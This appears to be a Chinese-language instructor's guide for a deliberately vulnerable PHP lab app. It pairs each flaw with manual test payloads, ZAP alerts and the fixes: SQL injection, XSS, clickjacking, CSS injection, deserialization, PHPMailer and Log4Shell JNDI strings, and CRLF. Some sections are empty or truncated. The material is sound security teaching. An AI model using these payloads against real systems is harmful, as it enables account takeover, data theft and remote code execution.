## 🛠️ 各弱點教學演示指引

### 1. SQL 注入綜合演練 (SQLi Variants)
- **弱點位置**：
  - 登入介面：`/login.php` (POST 欄位 `username`)
  - 課程搜尋：`/courses.php` (GET 參數 `q`) 與 `/course_detail.php` (GET 參數 `id`)
  - 綜合演練中心：`/sqli_variants.php` (包含 UNION, Boolean-based, Time-based, Stored Procedure 四大變體)
- **檢測方式**：
  - **手動驗證 1 - 登入驗證繞過**：在 `/login.php` 的帳號輸入欄位輸入 `admin' -- `，即可繞過密碼直接以管理員身份登入。
  - **手動驗證 2 - UNION 注入**：
    - 在 `/sqli_variants.php?tab=union` 輸入：
      `' UNION SELECT 1, username, password_hash, role FROM users -- `
      即可直接將 `users` 資料表內的所有帳密與角色倒出來顯示在網頁上。
  - **手動驗證 3 - 布林盲注 (Boolean Blind SQLi)**：
    - 在 `/sqli_variants.php?tab=boolean` 中，輸入 `student01' AND 1=1 -- `，回顯顯示「該帳號名稱已被註冊」；
    - 輸入 `student01' AND 1=2 -- `，回顯顯示「該帳號名稱尚未使用」。這說明雖然沒有直接回顯資料庫內容，但攻擊者能透過 true/false 二元狀態逐步猜解出資料庫敏感資料。
  - **手動驗證 4 - 時間盲注 (Time-based SQLi)**：
    - 在 `/sqli_variants.php?tab=time` 中，輸入 `1 AND SLEEP(5)`。
    - 觀察網頁響應時間，是否剛好延遲 5 秒後才回傳結果，這說明即使無任何前端資料回顯，攻擊者仍能透過時間延遲檢測並盲注猜解整個資料庫。
  - **手動驗證 5 - 預存程序注入 (Stored Procedure SQLi)**：
    - 在 `/sqli_variants.php?tab=sp` 中，輸入 `1) OR 1=1 -- `。
    - 這會閉合 CALL 預存程序的括號，繞過單一 ID 限制，將所有課程資料庫內容一次全部撈出。
- **修補版檔案**：
  - `app-fixed/public/login.php`、`app-fixed/public/courses.php`、`app-fixed/public/sqli_variants.php`（皆套用 PDO 預編譯語句，並在呼叫 Stored Procedure時使用安全參數綁定）
- **上課講解重點**：
  - **UNION 注入**：當頁面有回顯時，利用 `UNION` 合併查詢結果，是高危且快速的拖庫方式。
  - **布林盲注與時間盲注**：解釋當系統不顯示錯誤與資料時，如何利用「邏輯判斷」與「時間函數」猜解資料。
  - **預存程序注入**：澄清「使用 Stored Procedure 不等於絕對安全」的迷思，強調如果在 SQL 中動態拼接呼叫語句（例如 `CALL my_proc('$param')`），同樣會引起嚴重的 SQL 注入，必須使用參數化語法呼叫（`CALL my_proc(:param)`）。

### 2. 專屬：反射型 XSS (Reflected XSS)
- **弱點位置**：`/xss_reflected.php`
- **檢測方式**：
  - ZAP 主動掃描：會發出 `Cross Site Scripting (Reflected)` 警報 (🔴 High/🟡 Medium Risk)。
  - 手動驗證：在搜尋欄位輸入 `<script>alert(1)</script>` 並送出，或直接存取：
    `/xss_reflected.php?keyword=<script>alert(1)</script>`
    網頁會直接彈出警報，證明反射型 XSS 存在。
- **修補版檔案**：`app-fixed/public/xss_reflected.php`
- **上課講解重點**：
  - 反射型 XSS 的特徵：Payload 存在於 URL 請求中，經由伺服器接收後「原封不動」反射回瀏覽器渲染執行。
  - 防禦關鍵：對所有輸出至 HTML 的動態內容使用 `htmlspecialchars($str, ENT_QUOTES, 'UTF-8')` 進行 HTML 編碼。

### 2a. 專屬：預存型 XSS (Stored XSS)
- **弱點位置**：`/xss_stored.php`
- **檢測方式**：
  - ZAP 主動掃描：會發出 `Cross Site Scripting (Stored)` 警報 (🟡 Medium Risk)。
  - 手動驗證：在訪客留言框中輸入：
    `<script>alert(document.cookie)</script>`
    送出留言後，該 Payload 會永久寫入資料庫。此後任何人造訪 `/xss_stored.php` 皆會自動執行該腳本。
  - **核心設定錯誤對照 (Session Cookie 缺少 HttpOnly)**：
    - 在**弱點版**中彈出的內容會包含明文的 `PHPSESSID=...`。因為弱點版 `helpers.php` 未設定 `httponly => true`，JavaScript 可以直接讀取 Cookie，導致帳號能被輕易竊取。
    - 在**修正版**中，即使觸發了 XSS（假設有漏洞），由於設定了 `httponly => true`，JavaScript 的 `document.cookie` 也將讀取不到 `PHPSESSID`，證明了 HttpOnly 對 Session 的保護效果。
- **修補版檔案**：`app-fixed/public/xss_stored.php`
- **上課講解重點**：
  - 儲存型 XSS 的高危害性：Payload 被持久化在資料庫中，所有瀏覽該頁面的使用者都會受害（具備蠕蟲傳播與大規模個資竊取風險）。
  - 修補重點：輸入使用 Prepared Statements 防 SQL 注入；輸出時必須使用 `h()` 對所有留言欄位編碼。

### 2b. 專屬：DOM-based XSS
- **弱點位置**：`/xss_dom.php`
- **檢測方式**：
  - ZAP 主動掃描：透過 AJAX Spider 與 DOM XSS 掃描規則，ZAP 能模擬動態瀏覽器行為，偵測出利用 `location.hash` 讀取並渲染的 DOM 警報。
  - 手動驗證：在網址列後面加上：
    `#name=<img src=x onerror=alert(document.cookie)>`
    按下 Enter 重新整理，網頁即會彈出 Session ID 視窗，證明 DOM-based XSS 成立。
- **修補版檔案**：`app-fixed/public/xss_dom.php`
- **上課講解重點**：
  - DOM-based XSS 的本質：漏洞成因完全在於**前端 JavaScript** 的程式碼邏輯（不安全地操作 DOM 屬性如 `innerHTML` 載入不受信任的 source），而非後端伺服器回顯。
  - 防禦關鍵：在前端操作 DOM 時，應優先使用 `textContent` 或 `innerText` 屬性代替 `innerHTML`，強制瀏覽器以純文字解析。

### 12. 行動定位打卡與 HTML5 本地儲存 (IDOR / SQLi / DOM XSS / 敏感資訊洩漏)
- **弱點位置**：`/checkin.php`、`/api/checkin.php`、`/api/checkin_history.php`
- **檢測方式**：
  - **ZAP 掃描**：
    - 主動掃描 `/api/checkin.php` 會回報 `SQL Injection` 警報 (🔴 High Risk)。
    - 被動/主動掃描 `/checkin.php` 會識別出 DOM-based XSS 漏洞。
  - **手動驗證 1 - localStorage 敏感資料洩漏**：
    - 登入任一帳號，按 F12 開啟開發者工具，點選 Application -> Local Storage。
    - 會發現 `user_session` 鍵值中，竟以明文 JSON 儲存了使用者的 `api_token` 等敏感資訊。這代表只要全站有任何 XSS 漏洞（例如留言板的 Stored XSS），攻擊者即可透過 `localStorage.getItem('user_session')` 直接竊取用戶 Token。
  - **手動驗證 2 - 定位資料 IDOR 越權**：
    - 以 `student01` (ID=2) 登入，進入打卡頁面 `/checkin.php`。

  - **手動驗證 3 - DOM-based XSS**：
    - 於 F12 瀏覽器 Console 執行：`localStorage.setItem('last_location_memo', '<img src=x onerror=alert(document.domain)>')`
    - 重新整理打卡頁面 `/checkin.php`，將會成功彈窗，驗證了 DOM-based XSS。
- **修補版檔案**：
  - `app-fixed/public/checkin.php` (將 innerHTML 替換為安全的 text/textContent 渲染)
  - `app-fixed/public/api/checkin.php` (使用 PDO 參數化預處理)
  - `app-fixed/public/api/checkin_history.php` (後端強制驗證 `$target_user_id === $_SESSION['user']['id']`，拒絕水平越權)
  - `app-fixed/public/index.php` (登入時不再往 localStorage 存入敏感 Token)
- **上課講解重點**：
  - 說明 HTML5 API 與行動裝置功能的興起帶來的資安新挑戰。
  - 闡述 `localStorage` 與 `Cookie (HttpOnly)` 的差別，強調敏感憑證或 Session 絕不能存放在 `localStorage` 中。
  - 解釋 DOM-based XSS 與一般反射型/儲存型 XSS 在渲染鏈上的不同，說明防禦 DOM XSS 必須安全地操作 DOM 屬性 (如 textContent) 的觀念。

### 13. 點擊劫持 (Clickjacking)
- **弱點位置**：`/clickjacking_poc.php` (PoC 攻擊模擬頁) 與 `/clickjacking_target.php` (遭嵌入的個人設定目標頁)
- **檢測方式**：
  - **ZAP 掃描**：被動掃描 `/clickjacking_target.php` 時會發出 `Web Browser X-Frame-Options Header Not Set` 警報 (🟡 Medium Risk)。
  - **手動驗證 (PoC)**：
    1. 確保已登入弱點版網站，接著造訪 `http://localhost:8080/clickjacking_poc.php`。
    2. 此頁面中，下層放置了一個吸引使用者的黃色誘餌按鈕「🎁 點我領取免費 iPhone」（`z-index: 1`），最上層則覆蓋了一個**完全透明**（預設為 `opacity: 0.4` 半透明便於教學對照，可調至 `0.0` 完全透明）的 iframe（`z-index: 10`），載入目標頁 `/clickjacking_target.php`。
    3. 誘餌按鈕與 iframe 內部的紅色敏感按鈕「💥 確定刪除我的帳號」在位置與尺寸上**達成像素級完美對齊**。
    4. 當學員切換至 `0.0` 完全透明並點擊黃色按鈕時，實際上點擊到了透明 iframe 上方的紅色按鈕，觸發了帳號刪除的 POST 請求，網頁隨即顯示「💥 您的帳號已被刪除！」，證明點擊劫持攻擊成功。
- **修補版檔案**：
  - `app-fixed/public/clickjacking_target.php`（於頁面輸出 `X-Frame-Options: DENY` 與 CSP `frame-ancestors 'none';` 回應標頭）
  - 驗證方法：造訪 `http://localhost:8081/clickjacking_poc.php` (修正版)，會發現 iframe 無法顯示（呈現空白），瀏覽器主控台會拋出 `Refused to display... in a frame because it set 'X-Frame-Options' to 'deny'`，證明點擊劫持已被成功阻斷。
- **上課講解重點**：
  - 說明點擊劫持的視覺欺騙原理：攻擊者如何利用「上層完全透明且具備高 `z-index` 的目標 iframe」覆蓋「下層誘餌內容（如抽獎、玩遊戲）」，誘騙使用者在信任的網站上執行非自願的操作（如轉帳、修改密碼、授權、刪除帳號等）。
  - 介紹 `X-Frame-Options` 的三個值（`DENY`, `SAMEORIGIN`, `ALLOW-FROM`）與 CSP 的 `frame-ancestors` 指令，並說明它們如何告訴瀏覽器是否允許該網頁被嵌入 iframe 中。

### 14. 不安全瀏覽器快取 (Insecure Browser Caching)
- **弱點位置**：全站所有敏感頁面 (例如 `/profile.php`、`/api/profile.php`、`/api/checkin_history.php` 等個資或權限頁面)
- **檢測方式**：
  - **ZAP 掃描**：被動掃描這些敏感頁面時，ZAP 會回報 `Cache-Control Header Not Set` 警報 (🔵 Low Risk)。
  - **手動驗證**：
    - 以任何使用者登入，並瀏覽個人資料頁 `/profile.php`。
    - 按 F12 打開開發者工具，點擊 **Network** (網路) 面板，重新整理頁面。
    - 點選 `/profile.php` 請求，在 **Response Headers** 中：
      - **弱點版**：沒有 `Cache-Control` 相關的安全限制，或是顯示預設的可快取屬性。這意味著一旦學員在此電腦登出，下一個使用者仍可能透過瀏覽器的「上一頁」或本機硬碟快取提取出上一位使用者的敏感個資。
      - **修正版**：會看見伺服器發送了明確的停用快取標頭：
        `Cache-Control: no-store, no-cache, must-revalidate, max-age=0`
        `Pragma: no-cache`
        `Expires: 0`
        其中最重要的就是 **`no-store`**，它指示瀏覽器及所有中介代理伺服器（如 CDN）**絕對不可以**將此內容寫入本機快取硬碟或保留在記憶體中。
- **修補版檔案**：
  - `app-fixed/src/helpers.php` (在核心權限驗證函式 `check_auth` 內部統一輸出禁止快取的回應標頭)
- **上課講解重點**：
  - 說明在共用電腦環境下，瀏覽器快取殘留個資所帶來的隱私外洩風險。
  - 解釋 `Cache-Control` 的 `no-store` 與 `no-cache` 的本質差別：
    - `no-store`：**完全禁止快取**。不能將請求與回應的任何部分儲存在本機磁碟或快取中。
    - `no-cache`：可以快取，但**每次使用前必須向伺服器進行再驗證** (Revalidation)。
  - 指導學員正確設定防快取的 HTTP 標頭範例，並了解在開發敏感業務系統時，這是一項必備的安全基線。

### 15. 自訂版面 CSS 注入 (CSS Injection)
- **弱點位置**：`/css_injection.php`
- **檢測方式**：
  - **手動驗證 1 - 基礎注入修改排版**：
    - 進入 `/css_injection.php` 頁面。
    - 在自訂 CSS 代碼輸入框中輸入：
      `body { background-color: #ffcccc !important; }`
      點擊「儲存並套用樣式」，若發現全站背景成功被染成淡紅色，即代表 CSS 注入成功。
  - **手動驗證 2 - 遠端外聯資源載入**：
    - 在輸入框中注入惡意外聯：
      `body { background-image: url('http://localhost:8080/api/checkin_history.php?leak=1'); }`
      點擊儲存，此時查看瀏覽器開發者工具的 Network 面板，會看見瀏覽器在渲染網頁時，悄悄向該 API 接口發起請求。在實際攻擊中，攻擊者常利用此技巧將使用者的個資（或利用屬性選擇器將輸入框的值）外傳至攻擊者的接收端。
  - **手動驗證 3 - HTML 標籤逃逸 (轉化為 XSS)**：
    - 在輸入框中輸入：
      `</style><script>alert(document.domain)</script><style>`
      點擊儲存並套用，此時網頁會彈出 XSS 警告。這是因為弱點版完全沒有對輸入進行 HTML 編碼或逃逸符號檢查，導致攻擊者成功閉合了 `<style>` 標籤並轉化為 Stored XSS 攻擊。
- **修補版檔案**：
  - `app-fixed/public/css_injection.php` (後端執行黑名單過濾防止 `url()`、`@import`；禁止 HTML 標籤 `<`、`>` 注入，且在 style 渲染輸出時執行 htmlspecialchars 編碼)
- **上課講解重點**：
  - 說明 CSS 注入的危害不單是改變網頁外觀，還能透過載入外部背景圖片、外部字型發動資料外洩 (Data Exfiltration)。
  - 展示攻擊者如何利用 `</style>` 閉合標籤將 CSS 注入轉換為更嚴重的 XSS 攻擊。
  - 說明在實務中如果需要提供客製化 CSS 功能，最佳防禦為「使用白名單下拉式選單」或「利用正則嚴格檢驗排版字元，阻斷 url() 等所有外部連線行為」，以及在輸出 style 時確實執行編碼。

### 16. 不安全 HTML 表單配置 (Insecure HTML Form Configuration)
- **弱點位置**：`/form_risks.php`
- **檢測方式**：
  - **ZAP 掃描**：
    - ZAP 的被動掃描在分析此頁面原始碼時，會發出 `Auto-complete Enabled of Sensitive Input` 警報 (🔵 Low Risk)。
    - 若對表單執行主動/被動掃描，會因為表單缺少 CSRF 欄位而發出 `Absence of Anti-CSRF Tokens` 警報 (🟡 Medium Risk)。
    - 若提交表單，ZAP 會回報 `Sensitive Information in URL Query String` (🔵 Low Risk) 警報。
  - **手動驗證**：
    - 進入 `/form_risks.php` (弱點版)。
    - 填入測試個資與信用卡密碼並提交。
    - **預期結果 1**：瀏覽器上方網址列會包含密碼與卡號明文（例如 `?password=123&card_no=4111...`）。
    - **預期結果 2**：重新整理頁面，再次點選輸入框，會發現瀏覽器直接彈出下拉選單並顯示剛才輸入的信用卡與密碼資訊。
    - **預期結果 3**：檢查原始碼確認無 CSRF Token，且可輸入超過 100 字元的超長非法格式身分證與信用卡號提交，後端照單全收。
    - **預期結果 4 (後端資料校驗缺失與參數竄改)**：按 F12 將下拉選單 `ticket_type` 的 `option value` 修改為 `free_hacked`，或將身分折抵折扣率的 `discount_rate` 改為 `0.01` (極低折扣) 或 `-2.0` (負數套利)，或修改 URL 參數傳入非 Email 格式的 `email=invalid-string` 及非整數型態的 `quantity=abc`。送出後，弱點版後端未對資料進行任何過濾與型態驗證，全部照單全收，導致算出負數總價或金額異常，並顯示在頁面上。
- **修補版檔案**：
  - `app-fixed/public/form_risks.php`（將 GET 改為 POST 提交；在機敏欄位加入 `autocomplete="off"`；後端使用 `filter_var` 校驗 Email 格式、以白名單陣列防範下拉選單票券種類及 `discount_rate` 折扣率之參數竄改、以 `ctype_digit` 確保數量為正整數數字，並使用 CSRF Token）
- **上課講解重點**：
  - 講解瀏覽器自動完成（Autocomplete）對共用電腦（如圖書館、網咖）環境下的隱私威脅。
  - 說明 `autocomplete="off"` 的重要性以及為何密碼欄位建議配置 `autocomplete="new-password"`。
  - 指導學員區分 GET 與 POST 的安全特性，強調任何涉及敏感資訊、狀態變更的提交動作用 GET 是嚴重的安全缺失。
  - 傳授**「前端驗證不等於安全防護」**的核心理念：前端的限制（如 type="number", select 下拉選單）可輕易被 F12 或 Proxy 工具繞過，後端必須實施與前端對等的資料完整性與型態校驗。

### 17. AJAX 漏洞與 API 安全 (BOLA / IDOR / DOM XSS / CORS)

### 19. XML 外部實體注入 (XXE)

  - `app-fixed/src/helpers.php` (於初始化階段統一輸出 Response Headers)
- **上課講解重點**：
  - **HSTS (Strict-Transport-Security)** 的重要性：告訴瀏覽器在接下來的有效期內（如 1 年），對該域名的一切請求必須強制改為 HTTPS 加密連線，防止中間人攻擊（MITM）中的 SSL Stripping（HTTPS 降級攻擊）。
  - **Referrer Policy** 的作用：控制當使用者在當前網頁點選外鏈或載入外部資源時，瀏覽器在 `Referer` 請求標頭中攜帶的網址資訊量。設定為 `strict-origin-when-cross-origin` 可確保跨域時只傳送域名（Origin），不傳送完整的請求路徑（Path），防範路徑中含有的敏感個資或臨時 Token 外洩。

### 27. 不安全元件與軟體相依性漏洞 (Vulnerable and Outdated Components - PHP Deserialization / PHPMailer / Log4Shell)
- **弱點位置**：`/component_vulnerabilities.php`
- **檢測方式**：
  - **手動驗證 1 - PHP 反序列化 (Object Injection)**：
    1. 在 `/component_vulnerabilities.php?tab=deserialization` 中輸入序列化 payload：
       `O:19:"MockFrameworkGadget":1:{s:3:"cmd";s:6:"whoami";}`
    2. **預期結果 (弱點版)**：反序列化成功執行 `MockFrameworkGadget` 類別的 `__destruct` 析構函數，進而觸發系統指令 `whoami` 並顯示當前使用者（如 `www-data`）。
    3. **安全防護驗證 (安全版)**：使用 `unserialize($data, ['allowed_classes' => false])`，系統完全拒絕載入與實體化任何類別，並安全攔截物件，阻止 RCE。
  - **手動驗證 2 - PHPMailer 寄件者參數注入 (CVE-2016-10033)**：
    1. 在 `/component_vulnerabilities.php?tab=phpmailer` 中，在 Email 欄位輸入：
       `attacker -OQueueDirectory=/tmp -X/var/www/html/shell.php@sender.com`
    2. **預期結果 (弱點版)**：信箱中的空白字元與 `-O`/`-X` 參數成功被 sendmail 解析，模擬成功寫入 Web 檔案後門。
    3. **安全防護驗證 (安全版)**：透過 `FILTER_VALIDATE_EMAIL` 直接攔截此非法的郵件位址，並在呼叫發信指令時使用 `escapeshellarg()` 進行跳脫，阻止參數注入。
  - **手動驗證 3 - Apache Log4Shell JNDI 注入 (CVE-2021-44228)**：
    1. 在 `/component_vulnerabilities.php?tab=log4shell` 中，在 User-Agent 日誌輸入框輸入：
       `${jndi:ldap://192.168.1.100:1389/Exploit}`
    2. **預期結果 (弱點版)**：日誌引擎成功偵測到符合 JNDI 的表達式，並模擬發起 LDAP 連線與加載惡意 Class 的指令執行流程。
    3. **安全防護驗證 (安全版)**：全域禁用 JNDI Lookups (設定 `formatMsgNoLookups=true`)，在紀錄前主動移去 JNDI 表達式標籤，日誌僅作為純文字紀錄。
  - **手動驗證 4 - jQuery 選擇器 XSS (CVE-2015-9251)**：
    1. 在 `/component_vulnerabilities.php?tab=jquery` 的輸入框輸入：
       `<img src=x onerror=alert('jQuery_XSS_Success')>`
    2. **預期結果 (弱點版)**：點擊按鈕後，由於弱點版引入了過舊的 jQuery 1.11.0 且程式碼直接調用 `$(rawInput)`，將字串解析並執行，直接在瀏覽器彈出對話框。
    3. **安全防護驗證 (安全版)**：安全版升級為 `jQuery 3.7.1`，並在前端程式碼中對輸入進行前置檢測，一旦輸入以 `<` 開頭即直接予以阻斷，防止 DOM 渲染注入。
- **修補版檔案**：
  - `app-fixed/public/component_vulnerabilities.php` (四大經典組件與前端框架安全修補)
- **上課講解重點**：
  - **A06:2025 - 安全漏洞與過時元件** 的核心概念：現代系統大量引用第三方套件與套件管理工具 (如 Composer, npm, Maven)，程式碼的安全漏洞不只存在於自己寫的邏輯中，更頻繁出裝在引用的依賴項目中。
  - 說明 **PHP 反序列化 (Object Injection)** 的概念：當我們還原字串為物件時，PHP 引擎會執行魔術方法（如 `__wakeup` 或 `__destruct`），此時若類別屬性可控，便能發動 Gadget Chain 漏洞呼叫系統敏感函數。
  - 解釋 **Log4Shell** 作為史上最著名的元件漏洞之一，其關鍵在於**「日誌模組在解析紀錄內容時，誤將內容當作表達式進行了主動的遠端查詢」**，違反了資料與程式碼隔離原則。
  - 講解 **jQuery 選擇器 XSS** 的威脅：展示即便後端十分安全，若前端引用了帶有已知漏洞的舊版 JavaScript 函式庫，也極易破壞 DOM 完整性導致用戶端遭受 XSS 劫持。

- **修補版檔案**：`app-fixed/public/file_inclusion.php` (實作 `about.php`, `contact.php`, `faq.php` 白名單查表過濾)
- **上課講解重點**：
  - 說明 **LFI (Local File Inclusion)** 與 **RFI (Remote File Inclusion)** 的基本概念。這兩種漏洞在 PHP 早期極為普遍，關鍵成因在於**「動態載入的檔案路徑完全受控於使用者輸入」**。
  - 闡明 allow_url_include、allow_url_fopen 等 php.ini 指令的資安威脅：當 `allow_url_include` 開啟時，`include` 可直接加載遠端腳本，造成最嚴重的遠端指令執行 (RCE)。
  - 強調最安全且徹底的防禦方式是**「使用硬編碼的白名單 (Whitelist)」**，絕對不應將使用者控制的字串直接傳遞至 `include`、`require` 等檔案加載 API。

### 35. 明文密碼儲存 (Plaintext Password Storage)
- **弱點位置**：`/login.php`、`/reset_password.php`、資料庫 `users` 表的 `password_hash` 欄位
- **檢測方式**：
  - ZAP 掃描：在 AJAX 查詢或 API 資料洩漏頁中，ZAP 被動偵測到符合 32 字元 Hex 的 明文特徵並輸出於網頁中時，會發出 `Hash Disclosure` 警報。
  - 手動驗證：
    1. 使用 SQL 注入或直接查詢資料庫（或存取 AJAX 查詢結果 `http://localhost:8080/ajax_vulnerability.php`）。
    2. **預期結果 (弱點版)**：查閱使用者的 `password_hash` 欄位，發現均為 32 字元的明文 Hex 字串（如 `5f4dcc3b5aa765d61d8327deb882cf99`，即 `password123` 的 MD5 值）。攻擊者可直接上網透過 MD5 解密網站（如 cmd5.com）或使用彩虹表（Rainbow Tables）在一秒內反推出使用者的明文密碼。
    3. **安全防護驗證 (安全版)**：
       - 存取安全版資料庫或 API，密碼雜湊為以 `$2y$` 開頭的 60 字元高強度 Bcrypt 雜湊（如 `$2y$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC/.og/at2.uheWG/igi`）。
       - 該雜湊自帶隨機 Salt（鹽值），且為慢速雜湊，無法使用彩虹表還原，GPU 暴破成本極高。
- **修補版檔案**：`app-fixed/public/login.php`、`app-fixed/public/reset_password.php` (皆採用 `password_hash($pwd, PASSWORD_DEFAULT)` 與 `password_verify($pwd, $hash)` 做安全處理)
- **上課講解重點**：
  - 闡明**雜湊（Hashing）不等於加密（Encryption）**。密碼「絕對不能」以明文或可逆的對稱加密儲存，必須使用「單向雜湊函數」。
  - 講解 **MD5 與 SHA1 的不安全性**：這類演算法因為運算速度極快且存在碰撞漏洞，在現今已被視為不安全（Broken Cryptography）。攻擊者可輕易透過龐大的彩虹表庫或顯示卡（Hashcat）進行快速逆向爆破。
  - 介紹現代密碼雜湊標準（如 **Bcrypt、Argon2id**）：這類「慢速雜湊」可人為調整工作因子（Work Factor/Cost），且每次雜湊皆會自動生成隨機鹽值（Salt），即使兩名使用者密碼完全相同，產生的密碼雜湊值也截然不同，能徹底防範彩虹表攻擊。

### 36. 子資源完整性缺失 (Missing Subresource Integrity - SRI)
- **弱點位置**：全站所有引入外部 CDN 資源的 HTML 頁面（例如 `<link>` 與 `<script>` 標籤）
- **檢測方式**：
  - ZAP 被動掃描：當偵測到頁面引用了外部域名的 JavaScript 或 CSS，但該標籤上缺少 `integrity` 屬性時，會發出 `Subresource Integrity Attribute Missing` (🟡 Medium/🔵 Low Risk) 警報。
  - 手動驗證：
    1. 在瀏覽器中存取任一頁面 (例如首頁 `index.php`)，點選右鍵「檢視網頁原始碼」。
    2. 尋找 `<script src="https://code.jquery.com/jquery...`。
    3. **預期結果 (弱點版)**：
       僅有單純的 `src` 或 `href` 屬性，無額外校驗屬性：
       ```html
       <script src="https://code.jquery.com/jquery-1.12.4.min.js"></script>
       ```
    4. **安全防護驗證 (安全版)**：
       所有引入外部 CDN 的標籤皆配置了標準的 `integrity` 雜湊驗證與 `crossorigin` 屬性：
       ```html
       <script src="https://code.jquery.com/jquery-3.7.1.min.js" integrity="sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo=" crossorigin="anonymous"></script>
       ```
- **修補版檔案**：`app-fixed/public/` 下的所有 PHP 網頁
- **上課講解重點**：
  - 介紹 **SRI (Subresource Integrity)** 的防禦機制。當第三方 CDN 服務商遭遇 DNS 劫持、伺服器被駭或惡意代碼投毒時，瀏覽器會無條件加載該惡意腳本，導致使用者遭受 XSS 攻擊。
  - 闡明 `integrity` 的工作原理：瀏覽器加載檔案後，會先在本地計算該檔案的 SHA 雜湊值（如 `sha256` 或 `sha384`），並與 `integrity` 屬性中的雜湊進行嚴格比對。一旦發現不一致（代表檔案內容在傳輸中被竄改），瀏覽器會**拒絕執行該資源**，保護客戶端安全。
  - 強調在使用第三方 CDN 加載開源庫時，必須養成搭配 `integrity` 與 `crossorigin="anonymous"` 的良好開發安全習慣。

### 38. HTTP 標頭 SQL 注入 (HTTP Header SQL Injection)
- **弱點位置**：`/login.php` (系統後台日誌寫入功能)
- **檢測方式**：
  - ZAP 主動掃描：對登入端點執行主動掃描時，ZAP 會嘗試在 HTTP 要求標頭（如 `User-Agent`、`Referer`）中塞入 SQLi 偵測字串，一旦回應中爆出 SQL 語法錯誤或發現延遲回應，會發出 `SQL Injection` (🔴 High Risk) 警報。
  - 手動驗證：
    1. 使用 ZAP **Manual Request Editor** 複製一個登入的 POST 請求。
    2. 將 `User-Agent` 標頭內容改為 `' OR sleep(5) -- ` 或是帶有單引號 `'` 的惡意 Payload。
    3. **預期結果 (弱點版)**：資料庫執行插入日誌時發生語法衝突，直接拋出 PDOException 與 SQL 錯誤 Trace，或引發 5 秒以上的時間盲注延遲。
    4. **安全防護驗證 (安全版)**：安全版使用參數化查詢對 User-Agent 進行防護處理，不論傳入何種惡意字串，皆會被當作普通文字寫入，不干擾 SQL 命令執行。
- **修補版檔案**：`app-fixed/src/helpers.php` (在 `write_audit_log` 內使用 Prepared Statements 安全寫入)
- **上課講解重點**：
  - 破除學員**「只有 GET / POST 參數需要防護 SQLi」**的錯誤觀念。只要是「來自使用者端輸入且最終會進入 SQL 指令」的欄位（包括 User-Agent, Referer, X-Forwarded-For 乃至於 Cookie 內容），全都必須使用 Prepared Statements 進行安全參數化查詢！

### 41. HTTP 響應分裂 / CRLF 注入
- **弱點位置**：`/crlf_injection.php` (POST 參數 `url`)
- **檢測方式**：
  - ZAP 主動掃描：在對該跳轉端點進行掃描時，會自動嘗試在參數中注入 `%0d%0a`，若回傳封包出現多餘的 HTTP Header，將發出 `CRLF Injection` 或 `Response Splitting` (🔴 High/🟡 Medium Risk) 警報。
  - 手動驗證：
    1. 在目標跳轉網址輸入框中輸入：
       `http://google.com%0d%0aSet-Cookie: dummy_session=hacker_fix_12345`
    2. **預期結果 (弱點版)**：在右側的模擬 HTTP 響應數據包中，成功注入了一行全新的 `Set-Cookie` 響應標頭，表示攻擊者能控制 HTTP Header。
    3. **安全防護驗證 (安全版)**：安全版在解碼後將所有的 `\r` (CR)、`\n` (LF) 及其 URL 編碼徹底移除，注入的標頭字元被當作普通網址字元處理。
- **修補版檔案**：`app-fixed/public/crlf_injection.php`
- **上課講解重點**：
  - 解釋 CRLF 注入 (CWE-93) 原理。HTTP 協議是以 `\r\n` (CRLF) 來區分每個 Header 行的。如果使用者輸入可以引入換行，就能欺騙 Web 伺服器甚至中介 Proxy 產生兩個 Header（響應分裂）。
  - 強調防禦重點：在呼叫 `header()` 跳轉或寫入響應標頭前，必須對所有輸入過濾 `\r` (%0d) 與 `\n` (%0a) 字元。

- **上課講解重點**：
